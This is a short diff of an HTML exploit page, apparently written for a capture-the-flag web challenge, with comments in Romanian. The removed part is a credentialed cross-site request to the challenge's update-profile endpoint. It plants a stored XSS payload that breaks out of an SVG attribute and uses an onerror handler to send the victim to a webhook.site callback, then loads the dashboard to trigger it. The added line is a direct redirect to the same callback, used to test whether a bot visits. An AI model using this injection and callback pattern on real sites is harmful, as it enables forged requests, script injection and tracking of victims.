@@ -2,22 +2,8 @@
 <html>
 <body>
 <script>
-// Step 1: Inject XSS payload - DOAR redirect la webhook pentru test
-fetch('http://ctf.learn-it.org:39951/api/update-profile', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    credentials: 'include',
-    body: JSON.stringify({
-        avatar: {
-            background: '"></svg><img src=x onerror=location="https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?xss=triggered">'
-        }
-    })
-}).then(() => {
-    // Step 2: Redirect to dashboard to trigger XSS
-    setTimeout(() => {
-        location = 'http://ctf.learn-it.org:39951/dashboard';
-    }, 1000);
-});
+// Direct redirect - o să testăm dacă primim notification
+location = 'https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?test=bot_visited_github';
 </script>
 </body>
 </html>
